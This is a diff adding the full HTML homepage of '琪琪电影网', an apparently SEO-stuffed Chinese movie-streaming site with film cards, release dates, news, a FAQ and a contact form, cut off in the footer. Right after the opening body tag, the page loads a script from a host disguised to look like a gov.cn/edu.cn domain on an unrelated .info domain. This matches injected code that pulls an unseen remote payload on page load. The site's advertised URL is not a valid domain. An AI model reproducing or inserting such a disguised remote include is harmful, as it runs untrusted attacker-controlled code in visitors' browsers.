@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>琪琪电影网 - 高清影视在线观看_最新电影电视剧推荐_琪琪电影网官方入口</title>
+<meta name="description" content="琪琪电影网(https://qiqidianyingwang-app)提供最新高清电影、热播电视剧、动漫综艺在线观看与影视资讯推荐，每日更新热门片单、影视分类导航与观影攻略，琪琪电影网是你随身的高清影视指南。">
+<meta name="keywords" content="琪琪电影网,qiqidianyingwang-app,琪琪电影,高清电影在线观看,最新电影推荐,热播电视剧,影视资讯,免费看电影">
+<meta name="author" content="琪琪电影网">
+<meta name="robots" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#12071f">
+<link rel="canonical" href="https://qiqidianyingwang-app/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="琪琪电影网">
+<meta property="og:title" content="琪琪电影网 - 高清影视在线观看_最新电影电视剧推荐">
+<meta property="og:description" content="琪琪电影网(https://qiqidianyingwang-app)每日更新高清电影、热播剧集与影视资讯，热门片单一站直达。">
+<meta property="og:url" content="https://qiqidianyingwang-app/">
+<meta property="og:image" content="https://qiqidianyingwang-app/logo.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="琪琪电影网 - 高清影视在线观看">
+<meta name="twitter:description" content="琪琪电影网(https://qiqidianyingwang-app)高清电影、热播剧集、影视资讯每日更新。">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "name": "琪琪电影网",
+      "alternateName": "qiqidianyingwang-app",
+      "url": "https://qiqidianyingwang-app/",
+      "description": "琪琪电影网提供高清电影、热播电视剧、动漫综艺的在线观看与影视资讯推荐服务。",
+      "inLanguage": "zh-CN",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://qiqidianyingwang-app/search?q={search_term_string}",
+        "query-input": "required name=search_term_string"
+      }
+    },
+    {
+      "@type": "Organization",
+      "name": "琪琪电影网",
+      "url": "https://qiqidianyingwang-app/",
+      "logo": "https://qiqidianyingwang-app/logo.png",
+      "description": "琪琪电影网是专注高清影视内容与影视资讯推荐的影视站点。"
+    }
+  ]
+}
+</script>
+<style type="text/css">
+:root{
+  --bg:#12071f;
+  --bg2:#1d0b31;
+  --card:rgba(255,255,255,.06);
+  --line:rgba(255,255,255,.12);
+  --gold:#ffc861;
+  --pink:#ff4d9d;
+  --purple:#8b5cf6;
+  --text:#f3ecff;
+  --sub:#b9aecd;
+  --radius:18px;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;scroll-padding-top:74px}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.7;
+  overflow-x:hidden;
+  background-image:
+    radial-gradient(900px 500px at 12% -8%,rgba(139,92,246,.35),transparent 60%),
+    radial-gradient(760px 460px at 92% 4%,rgba(255,77,157,.28),transparent 62%),
+    radial-gradient(700px 500px at 50% 110%,rgba(255,200,97,.16),transparent 60%);
+  background-attachment:fixed;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{width:min(1180px,92vw);margin:0 auto}
+
+/* 顶部进度条 */
+.progress{position:fixed;top:0;left:0;height:3px;width:0;z-index:99;
+  background:linear-gradient(90deg,var(--purple),var(--pink),var(--gold));}
+
+/* 头部 */
+header{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);
+  background:rgba(18,7,31,.82);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:66px;gap:14px}
+.logo{display:flex;align-items:center;gap:10px;font-size:20px;font-weight:800;letter-spacing:.5px;white-space:nowrap}
+.logo .mark{width:38px;height:38px;border-radius:12px;display:grid;place-items:center;font-size:19px;
+  background:linear-gradient(135deg,var(--pink),var(--purple));box-shadow:0 8px 20px rgba(255,77,157,.35)}
+.logo b{background:linear-gradient(90deg,var(--gold),#fff);-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo span{font-size:11px;color:var(--sub);font-weight:500;display:block;letter-spacing:1px}
+.menu{display:flex;align-items:center;gap:4px}
+.menu a{font-size:14.5px;padding:9px 13px;border-radius:999px;color:var(--sub);transition:.25s}
+.menu a:hover,.menu a.on{color:#fff;background:rgba(255,255,255,.1)}
+.burger{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:12px;background:var(--card);
+  cursor:pointer;place-items:center}
+.burger i{display:block;width:18px;height:2px;background:#fff;position:relative}
+.burger i::before,.burger i::after{content:"";position:absolute;left:0;width:18px;height:2px;background:#fff}
+.burger i::before{top:-6px}.burger i::after{top:6px}
+
+/* Hero */
+.hero{padding:64px 0 40px;position:relative}
+.hero .filmstrip{position:absolute;inset:0;opacity:.16;pointer-events:none;
+  background-image:repeating-linear-gradient(90deg,transparent 0 16px,rgba(255,255,255,.5) 16px 18px);
+  -webkit-mask-image:linear-gradient(180deg,transparent,#000 30%,transparent);
+  mask-image:linear-gradient(180deg,transparent,#000 30%,transparent)}
+.tagline{display:inline-flex;align-items:center;gap:8px;font-size:12.5px;color:var(--gold);
+  border:1px solid rgba(255,200,97,.4);background:rgba(255,200,97,.1);
+  padding:6px 14px;border-radius:999px;letter-spacing:1px}
+h1{font-size:clamp(32px,6.4vw,60px);line-height:1.18;margin:18px 0 12px;font-weight:900;letter-spacing:-1px}
+h1 em{font-style:normal;background:linear-gradient(100deg,var(--gold),var(--pink) 55%,var(--purple));
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.lead{font-size:clamp(15px,2.4vw,18px);color:var(--sub);max-width:680px}
+.urlbox{margin-top:22px;display:inline-flex;align-items:center;gap:10px;flex-wrap:wrap;
+  border:1px dashed rgba(255,255,255,.28);border-radius:14px;padding:10px 16px;background:rgba(255,255,255,.04)}
+.urlbox b{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px;color:var(--gold);letter-spacing:.6px}
+.urlbox small{color:var(--sub);font-size:12.5px}
+.hero-btns{display:flex;gap:12px;margin-top:26px;flex-wrap:wrap}
+.btn{border-radius:999px;padding:13px 26px;font-size:15px;font-weight:700;transition:.25s;display:inline-block}
+.btn-p{background:linear-gradient(135deg,var(--pink),var(--purple));color:#fff;box-shadow:0 12px 26px rgba(139,92,246,.35)}
+.btn-o{border:1px solid var(--line);color:#fff;background:var(--card)}
+.btn:hover{transform:translateY(-2px)}
+
+/* 统计 */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:38px 0 8px}
+.stat{border:1px solid var(--line);border-radius:var(--radius);background:var(--card);padding:18px 16px;text-align:center}
+.stat b{display:block;font-size:clamp(22px,4vw,30px);color:var(--gold);font-weight:900}
+.stat span{font-size:12.5px;color:var(--sub)}
+
+/* 通用板块 */
+section{padding:56px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:clamp(22px,4.2vw,32px);font-weight:800;position:relative;padding-left:14px}
+.sec-head h2::before{content:"";position:absolute;left:0;top:.45em;width:5px;height:.72em;border-radius:4px;
+  background:linear-gradient(180deg,var(--gold),var(--pink))}
+.sec-head p{color:var(--sub);font-size:13.5px;max-width:520px}
+.sec-head .more{font-size:13.5px;color:var(--gold);border-bottom:1px solid rgba(255,200,97,.4);white-space:nowrap}
+
+/* 影片卡片 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:18px}
+.card{border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;background:var(--card);transition:.3s}
+.card:hover{transform:translateY(-6px);border-color:rgba(255,200,97,.5);box-shadow:0 18px 36px rgba(0,0,0,.4)}
+.poster{position:relative;aspect-ratio:3/4;display:grid;place-items:center;overflow:hidden}
+.poster .no{position:absolute;top:10px;left:10px;font-size:12px;font-weight:900;color:#fff;
+  background:rgba(0,0,0,.45);border:1px solid rgba(255,255,255,.3);border-radius:8px;padding:2px 8px;z-index:2}
+.poster .score{position:absolute;right:10px;top:10px;font-size:12px;font-weight:800;color:#1a0b00;background:var(--gold);
+  border-radius:8px;padding:2px 8px;z-index:2}
+.poster .name{font-size:clamp(17px,3.4vw,22px);font-weight:900;text-align:center;letter-spacing:1px;
+  text-shadow:0 4px 18px rgba(0,0,0,.55);padding:0 12px;z-index:2}
+.poster .kind{position:absolute;bottom:10px;left:10px;font-size:11.5px;color:#fff;background:rgba(0,0,0,.4);
+  border-radius:999px;padding:3px 10px;z-index:2}
+.poster::after{content:"";position:absolute;inset:0;
+  background-image:repeating-linear-gradient(45deg,rgba(0,0,0,.12) 0 8px,transparent 8px 16px)}
+.p1{background:linear-gradient(160deg,#3b1d6e,#ff4d9d)}
+.p2{background:linear-gradient(160deg,#0f3b57,#37d5d6)}
+.p3{background:linear-gradient(160deg,#5c1f0c,#ffc861)}
+.p4{background:linear-gradient(160deg,#12371f,#7ef29d)}
+.p5{background:linear-gradient(160deg,#2b1250,#8b5cf6)}
+.p6{background:linear-gradient(160deg,#4a1030,#ff7ac6)}
+.p7{background:linear-gradient(160deg,#0b2a4a,#5aa9ff)}
+.p8{background:linear-gradient(160deg,#4d3a05,#ffe08a)}
+.meta{padding:13px 14px 15px}
+.meta h3{font-size:15.5px;font-weight:700;margin-bottom:4px}
+.meta p{font-size:12.5px;color:var(--sub);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+/* 票根样式 新片 */
+.tickets{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
+.ticket{display:flex;gap:14px;align-items:center;padding:16px;border-radius:var(--radius);border:1px solid var(--line);
+  background:linear-gradient(135deg,rgba(255,255,255,.07),rgba(255,255,255,.02));position:relative}
+.ticket::before,.ticket::after{content:"";position:absolute;width:14px;height:14px;border-radius:50%;
+  background:var(--bg);top:50%;transform:translateY(-50%)}
+.ticket::before{left:-7px}.ticket::after{right:-7px}
+.ticket .day{flex:0 0 62px;text-align:center;border-right:1px dashed rgba(255,255,255,.25);padding-right:12px}
+.ticket .day b{display:block;font-size:24px;color:var(--gold);font-weight:900;line-height:1.1}
+.ticket .day span{font-size:11.5px;color:var(--sub)}
+.ticket .info h3{font-size:15.5px;margin-bottom:3px}
+.ticket .info p{font-size:12.5px;color:var(--sub)}
+.ticket .go{margin-left:auto;font-size:12.5px;color:var(--gold);border:1px solid rgba(255,200,97,.35);
+  border-radius:999px;padding:5px 12px;white-space:nowrap}
+
+/* 分类 */
+.cats{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+.cat{border:1px solid var(--line);border-radius:var(--radius);padding:22px 16px;text-align:center;background:var(--card);transition:.3s}
+.cat:hover{background:rgba(139,92,246,.18);border-color:rgba(139,92,246,.5)}
+.cat i{font-style:normal;font-size:28px;display:block;margin-bottom:8px}
+.cat b{display:block;font-size:15.5px}
+.cat span{font-size:12px;color:var(--sub)}
+
+/* 资讯 */
+.news{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
+.post{border:1px solid var(--line);border-radius:var(--radius);background:var(--card);padding:20px;transition:.3s}
+.post:hover{border-color:rgba(255,200,97,.45)}
+.post time{font-size:12px;color:var(--gold);letter-spacing:.5px}
+.post h3{font-size:16.5px;margin:8px 0 8px;font-weight:700}
+.post p{font-size:13.5px;color:var(--sub)}
+.post .rd{margin-top:12px;font-size:13px;color:var(--pink)}
+
+/* 会员 */
+.vip{border:1px solid rgba(255,200,97,.32);border-radius:24px;padding:34px 26px;
+  background:radial-gradient(600px 300px at 20% 0%,rgba(255,200,97,.16),transparent 70%),rgba(255,255,255,.04)}
+.vip h2{font-size:clamp(21px,4vw,30px);margin-bottom:8px}
+.vip>p{color:var(--sub);font-size:14.5px;margin-bottom:22px}
+.perks{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:14px}
+.perk{border:1px solid var(--line);border-radius:14px;padding:16px;background:rgba(0,0,0,.22)}
+.perk b{display:block;font-size:15px;margin-bottom:4px}
+.perk b i{font-style:normal;color:var(--gold);margin-right:6px}
+.perk span{font-size:13px;color:var(--sub)}
+
+/* FAQ */
+.faq{border-top:1px solid var(--line)}
+.q{border-bottom:1px solid var(--line)}
+.q button{width:100%;text-align:left;background:none;border:0;color:var(--text);font-size:15.5px;font-weight:700;
+  padding:18px 40px 18px 0;cursor:pointer;position:relative;font-family:inherit}
+.q button::after{content:"+";position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:20px;color:var(--gold)}
+.q.open button::after{content:"−"}
+.q .a{display:none;padding:0 30px 18px 0;font-size:14px;color:var(--sub)}
+.q.open .a{display:block}
+
+/* 关于 & 联系 */
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:20px}
+.panel{border:1px solid var(--line);border-radius:var(--radius);background:var(--card);padding:24px}
+.panel h3{font-size:18px;margin-bottom:10px}
+.panel p{font-size:14px;color:var(--sub);margin-bottom:12px}
+.panel ul li{font-size:14px;color:var(--sub);padding-left:18px;position:relative;margin-bottom:8px}
+.panel ul li::before{content:"";position:absolute;left:0;top:.62em;width:7px;height:7px;border-radius:50%;background:var(--pink)}
+.contact div{margin-bottom:12px}
+.contact label{display:block;font-size:12.5px;color:var(--sub);margin-bottom:5px}
+.contact input,.contact textarea{width:100%;background:rgba(0,0,0,.28);border:1px solid var(--line);border-radius:12px;
+  color:var(--text);padding:12px 14px;font-size:14px;font-family:inherit;outline:none}
+.contact input:focus,.contact textarea:focus{border-color:var(--purple)}
+.contact textarea{resize:vertical;min-height:96px}
+
+/* 底部 */
+footer{border-top:1px solid var(--line);margin-top:30px;padding:44px 0 30px;background:rgba(0,0,0,.24)}
+.f-grid{display:grid;grid-template-columns:1.4fr repeat(3,1fr);gap:24px}
+.f-col h4{font-size:15px;margin-bottom:12px}
+.f-col a,.f-col li{display:block;font-size:13.5px;color:var(--sub);padding:5px 0}
+.f-col a:hover{color:var(--gold)}
+.f-bottom{border-top:1px solid var(--line);margin-top:26px;padding-top:18px;font-size:12.5px;color:var(--sub);
+  display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.f-bottom b{color:var(--gold)}
+.totop{position:fixed;right:18px;bottom:22px;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;
+  background:linear-gradient(135deg,var(--pink),var(--purple));color:#fff;font-size:18px;z-index:60;
+  box-shadow:0 10px 24px rgba(0,0,0,.4);opacity:0;pointer-events:none;transition:.3s}
+.totop.show{opacity:1;pointer-events:auto}
+
+.reveal{opacity:0;transform:translateY(24px);transition:.7s cubic-bezier(.2,.7,.3,1)}
+.reveal.in{opacity:1;transform:none}
+
+/* 移动端 */
+@media(max-width:900px){
+  .about,.f-grid{grid-template-columns:1fr}
+  .stats{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:760px){
+  .burger{display:grid}
+  .menu{position:absolute;top:66px;left:0;right:0;flex-direction:column;align-items:stretch;gap:0;
+    background:rgba(18,7,31,.97);border-bottom:1px solid var(--line);padding:8px 4vw 16px;
+    max-height:0;overflow:hidden;transition:.3s;opacity:0}
+  .menu.show{max-height:340px;opacity:1}
+  .menu a{padding:13px 6px;border-radius:10px;font-size:15px}
+  .hero{padding:40px 0 26px}
+  .logo span{display:none}
+  section{padding:40px 0}
+  .ticket{flex-wrap:wrap}
+  .ticket .go{margin-left:0}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .poster .name{font-size:16px}
+  .cats{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:420px){
+  .grid{grid-template-columns:1fr}
+  .stats{grid-template-columns:repeat(2,1fr)}
+}
+@media(prefers-reduced-motion:reduce){
+  .reveal{opacity:1;transform:none;transition:none}
+  html{scroll-behavior:auto}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="progress" id="bar"></div>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#top">
+      <span class="mark">▶</span>
+      <span><b>琪琪电影网</b><span>qiqidianyingwang-app</span></span>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#hot">热门影视</a>
+      <a href="#new">最新上线</a>
+      <a href="#category">影视分类</a>
+      <a href="#news">影视资讯</a>
+      <a href="#vip">会员特权</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="burger" id="burger" role="button" tabindex="0" aria-label="展开导航菜单" aria-expanded="false"><i></i></div>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- 首屏 -->
+  <div class="hero">
+    <div class="filmstrip"></div>
+    <div class="wrap">
+      <span class="tagline">◆ 每日更新 · 高清流畅 · 随时随地看</span>
+      <h1>琪琪电影网 · <em>高清影视在线观看</em><br>最新电影电视剧一站直达</h1>
+      <p class="lead">琪琪电影网（https://qiqidianyingwang-app）汇聚热门电影、热播剧集、动漫与综艺，每日更新片单与观影攻略，打开琪琪电影网，好片不再错过。</p>
+      <div class="urlbox">
+        <span>琪琪电影网官方网址：</span><b>https://qiqidianyingwang-app</b><small>（建议收藏，认准琪琪电影网唯一入口）</small>
+      </div>
+      <div class="hero-btns">
+        <a class="btn btn-p" href="#hot">立即看热门片单</a>
+        <a class="btn btn-o" href="#category">浏览影视分类</a>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>48000+</b><span>琪琪电影网片库资源</span></div>
+        <div class="stat"><b>200+</b><span>每日更新条目</span></div>
+        <div class="stat"><b>1080P</b><span>高清画质可选</span></div>
+        <div class="stat"><b>24H</b><span>全天候在线服务</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 栏目一：热门影视 -->
+  <section id="hot" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>琪琪电影网热门影视推荐</h2>
+          <p>由琪琪电影网编辑部精选的本周高热片单，覆盖动作、科幻、悬疑与治愈系佳作。</p>
+        </div>
+        <a class="more" href="#">查看完整榜单 →</a>
+      </div>
+      <div class="grid">
+        <article class="card">
+          <div class="poster p1"><span class="no">01</span><span class="score">9.2</span><span class="name">星际远航者</span><span class="kind">科幻 / 冒险</span></div>
+          <div class="meta"><h3>星际远航者</h3><p>一支远航舰队穿越未知星域，在时间与引力之间寻找人类新的家园。</p></div>
+        </article>
+        <article class="card">
+          <div class="poster p2"><span class="no">02</span><span class="score">8.9</span><span class="name">深海回声</span><span class="kind">悬疑 / 剧情</span></div>
+          <div class="meta"><h3>深海回声</h3><p>一桩沉船旧案牵出三代人的秘密，真相随潮水缓缓浮出水面。</p></div>
+        </article>
+        <article class="card">
+          <div class="poster p3"><span class="no">03</span><span class="score">9.0</span><span class="name">黄昏列车</span><span class="kind">文艺 / 爱情</span></div>
+          <div class="meta"><h3>黄昏列车</h3><p>一趟开往旧时光的列车，载着两位旅人重新走过各自的遗憾。</p></div>
+        </article>
+        <article class="card">
+          <div class="poster p4"><span class="no">04</span><span class="score">8.7</span><span class="name">山野来信</span><span class="kind">治愈 / 家庭</span></div>
+          <div class="meta"><h3>山野来信</h3><p>城市青年回到故乡小山村，在一封封旧信里读懂父辈的沉默。</p></div>
+        </article>
+        <article class="card">
+          <div class="poster p5"><span class="no">05</span><span class="score">8.8</span><span class="name">雾港追凶</span><span class="kind">犯罪 / 动作</span></div>
+          <div class="meta"><h3>雾港追凶</h3><p>雾色笼罩的港口城市，老刑警与新人搭档追查连环失踪案。</p></div>
+        </article>
+        <article class="card">
+          <div class="poster p6"><span class="no">06</span><span class="score">9.1</span><span class="name">纸上星河</span><span class="kind">动画 / 奇幻</span></div>
+          <div class="meta"><h3>纸上星河</h3><p>一本会呼吸的画册，把少女的梦带进了漂浮于云端的星河城。</p></div>
+        </article>
+        <article class="card">
+          <div class="poster p7"><span class="no">07</span><span class="score">8.6</span><span class="name">长街烟火</span><span class="kind">都市 / 群像</span></div>
+          <div class="meta"><h3>长街烟火</h3><p>一条老街上的六户人家，用十年光阴写就彼此的守望与和解。</p></div>
+        </article>
+        <article class="card">
+          <div class="poster p8"><span class="no">08</span><span class="score">8.5</span><span class="name">逆风球场</span><span class="kind">运动 / 热血</span></div>
+          <div class="meta"><h3>逆风球场</h3><p>一支垫底球队与一位固执教练，用一整个赛季完成自我救赎。</p></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：最新上线 -->
+  <section id="new" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>琪琪电影网最新上线排期</h2>
+          <p>琪琪电影网同步更新院线与平台的近期上线内容，抢先锁定你想看的那一场。</p>
+        </div>
+        <a class="more" href="#">订阅更新提醒 →</a>
+      </div>
+      <div class="tickets">
+        <div class="ticket">
+          <div class="day"><b>18</b><span>10月</span></div>
+          <div class="info"><h3>黎明之前</h3><p>战争 / 剧情 · 126分钟</p></div>
+          <a class="go" href="#">抢先看</a>
+        </div>
+        <div class="ticket">
+          <div class="day"><b>21</b><span>10月</span></div>
+          <div class="info"><h3>机械之心</h3><p>科幻 / 动作 · 108分钟</p></div>
+          <a class="go" href="#">抢先看</a>
+        </div>
+        <div class="ticket">
+          <div class="day"><b>25</b><span>10月</span></div>
+          <div class="info"><h3>橘子味的夏天</h3><p>青春 / 爱情 · 98分钟</p></div>
+          <a class="go" href="#">抢先看</a>
+        </div>
+        <div class="ticket">
+          <div class="day"><b>02</b><span>11月</span></div>
+          <div class="info"><h3>无妄之城</h3><p>悬疑 / 犯罪 · 115分钟</p></div>
+          <a class="go" href="#">抢先看</a>
+        </div>
+        <div class="ticket">
+          <div class="day"><b>08</b><span>11月</span></div>
+          <div class="info"><h3>云端牧民</h3><p>纪录 / 自然 · 92分钟</p></div>
+          <a class="go" href="#">抢先看</a>
+        </div>
+        <div class="ticket">
+          <div class="day"><b>15</b><span>11月</span></div>
+          <div class="info"><h3>荒原长歌</h3><p>西部 / 冒险 · 131分钟</p></div>
+          <a class="go" href="#">抢先看</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：影视分类 -->
+  <section id="category" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>琪琪电影网影视分类导航</h2>
+          <p>按类型、地区与年代快速筛选，琪琪电影网帮你三秒找到想看的内容。</p>
+        </div>
+        <a class="more" href="#">全部分类 →</a>
+      </div>
+      <div class="cats">
+        <a class="cat" href="#"><i>🎬</i><b>电影</b><span>动作 / 喜剧 / 爱情</span></a>
+        <a class="cat" href="#"><i>📺</i><b>电视剧</b><span>国产 / 韩剧 / 美剧</span></a>
+        <a class="cat" href="#"><i>🍿</i><b>综艺</b><span>真人秀 / 音乐 / 脱口秀</span></a>
+        <a class="cat" href="#"><i>🎨</i><b>动漫</b><span>日漫 / 国漫 / 剧场版</span></a>
+        <a class="cat" href="#"><i>🕵️</i><b>悬疑</b><span>推理 / 刑侦 / 惊悚</span></a>
+        <a class="cat" href="#"><i>🚀</i><b>科幻</b><span>太空 / 机甲 / 末世</span></a>
+        <a class="cat" href="#"><i>🎞️</i><b>纪录片</b><span>自然 / 人文 / 历史</span></a>
+        <a class="cat" href="#"><i>👨‍👩‍👧</i><b>家庭</b><span>亲子 / 治愈 / 温情</span></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：影视资讯 -->
+  <section id="news" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>琪琪电影网影视资讯</h2>
+          <p>新片定档、幕后花絮、观影榜单与行业观察，琪琪电影网为你持续播报。</p>
+        </div>
+        <a class="more" href="#">更多资讯 →</a>
+      </div>
+      <div class="news">
+        <article class="post">
+          <time datetime="2026-09-28">2026-09-28 · 新片速递</time>
+          <h3>多部华语新片集中定档，国庆档竞争提前升温</h3>
+          <p>琪琪电影网观察到，今年国庆档片单类型分布更为均衡，现实题材与动画作品占比明显提升。</p>
+          <a class="rd" href="#">阅读全文 →</a>
+        </article>
+        <article class="post">
+          <time datetime="2026-09-25">2026-09-25 · 观影榜单</time>
+          <h3>本周高分榜：三部小成本影片凭口碑逆袭</h3>
+          <p>琪琪电影网热度榜显示，观众对强叙事、弱特效的作品关注度正在回升。</p>
+          <a class="rd" href="#">阅读全文 →</a>
+        </article>
+        <article class="post">
+          <time datetime="2026-09-20">2026-09-20 · 幕后花絮</time>
+          <h3>《深海回声》拍摄手记：一场水下戏打磨了 40 天</h3>
+          <p>主创团队在采访中分享了置景与拍摄细节，琪琪电影网整理了完整的幕后时间线。</p>
+          <a class="rd" href="#">阅读全文 →</a>
+        </article>
+        <article class="post">
+          <time datetime="2026-09-16">2026-09-16 · 观影攻略</time>
+          <h3>家庭观影指南：如何挑选适合全家一起看的影片</h3>
+          <p>从分级提示到片长节奏，琪琪电影网给出一份可照着执行的选片清单。</p>
+          <a class="rd" href="#">阅读全文 →</a>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：会员特权 -->
+  <section id="vip" class="reveal">
+    <div class="wrap">
+      <div class="vip">
+        <h2>琪琪电影网会员特权</h2>
+        <p>开通琪琪电影网会员，解锁更高画质、更快更新与专属片单服务。</p>
+        <div class="perks">
+          <div class="perk"><b><i>◆</i>超清画质</b><span>支持 1080P 与 4K 可选码率，弱网也能流畅播放。</span></div>
+          <div class="perk"><b><i>◆</i>抢先更新</b><span>热门剧集与院线新片会员优先解锁，更新快人一步。</span></div>
+          <div class="perk"><b><i>◆</i>专属片单</b><span>按口味生成私人片单，琪琪电影网每周推送一次。</span></div>
+          <div class="perk"><b><i>◆</i>多端同步</b><span>收藏与观看记录在手机、平板与电脑之间实时同步。</span></div>
+          <div class="perk"><b><i>◆</i>免打扰体验</b><span>清爽播放界面，更少干扰，专注沉浸在剧情里。</span></div>
+          <div class="perk"><b><i>◆</i>线下活动</b><span>会员可参与琪琪电影网组织的观影团与主创交流。</span></div>
+        </div>
+        <div class="hero-btns"><a class="btn btn-p" href="#">了解会员方案</a><a class="btn btn-o" href="#faq">常见问题</a></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：常见问题 -->
+  <section id="faq" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>琪琪电影网常见问题</h2>
+          <p>关于访问、播放与内容更新的高频疑问，琪琪电影网在这里统一解答。</p>
+        </div>
+      </div>
+      <div class="faq" id="faqList">
+        <div class="q"><button type="button">琪琪电影网的官方网址是什么？</button><div class="a">琪琪电影网官方网址为 https://qiqidianyingwang-app，建议收藏后访问，避免误入仿冒站点。</div></div>
+        <div class="q"><button type="button">琪琪电影网的内容多久更新一次？</button><div class="a">琪琪电影网片库每日更新，热门剧集与院线新片通常在上线当日同步排期信息。</div></div>
+        <div class="q"><button type="button">手机上观看是否需要下载客户端？</button><div class="a">无需下载。琪琪电影网页面已做移动端自适应，用手机浏览器打开即可直接观看。</div></div>
+        <div class="q"><button type="button">播放卡顿或画质模糊怎么办？</button><div class="a">可在播放器中切换到更低码率，或在网络环境较好时选择 1080P 及以上画质。</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于我们 -->
+  <section id="about" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>关于琪琪电影网</h2>
+          <p>认识琪琪电影网，也欢迎把你的观影建议告诉我们。</p>
+        </div>
+        <a class="more" href="#">加入内容合作 →</a>
+      </div>
+      <div class="about">
+        <div class="panel">
+          <h3>琪琪电影网是谁</h3>
+          <p>琪琪电影网（https://qiqidianyingwang-app）是一个面向影视爱好者的内容推荐站点，专注于把分散的影视信息整理成一份清晰的观影地图：有什么值得看、什么时候上线、在哪里可以看到。</p>
+          <ul>
+            <li>每日整理热门片单与新片排期，减少筛选成本</li>
+            <li>按类型、地区、年代建立完整的影视分类导航</li>
+            <li>持续输出影视资讯、幕后花絮与实用观影攻略</li>
+            <li>移动端优先设计，通勤路上也能顺畅浏览</li>
+          </ul>
+          <p>无论你想找一部周末的电影，还是追一部正在更新的剧集，琪琪电影网都希望成为你打开次数最多的那一个入口。</p>
+        </div>
+        <div class="panel contact">
+          <h3>联系我们</h3>
+          <div><label for="cname">你的称呼</label><input id="cname" type="text" placeholder="怎么称呼你"></div>
+          <div><label for="cmail">邮箱地址</label><input id="cmail" type="text" placeholder="用于接收回复"></div>
+          <div><label for="cmsg">留言内容</label><textarea id="cmsg" placeholder="想推荐影片或反馈问题都可以写在这里"></textarea></div>
+          <a class="btn btn-p" href="#">提交留言</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="f-grid">
+      <div class="f-col">
+        <h4>琪琪电影网</h4>
+        <p style="font-size:13.5px;color:var(--sub)">琪琪电影网官方网址：https://qiqidianyingwang-app，高清影视在线观看与影视资讯推荐，每日更新。</p>
+      </div>
+      <div class="f-col">
+        <h4>内容栏目</h4>
+        <a href="#hot">热门影视</a>
+        <a href="#new">最新上线</a>
+        <a href="#category">影视分类</a>
+        <a href="#news">影视资讯</a>
+      </div>
+      <div class="f-col">
+        <h4>会员服务</h4>
+        <a href="#vip">会员特权</a>
+        <a href="#faq">常见问题</a>
+        <a href="#">更新提醒</a>
+        <a href="#">观影团</a>
+      </div>
+      <div class="f-col">
+        <h4>关于本站</h4>
+        <a href="#about">关于琪琪电影网</a>
+        <a href="#">内容合作</a>
+        <a href="#">版权声明</a>
+        <a href="#">意见反馈</a>
+      </div>
+    </div>
+    <div class="f-bottom">
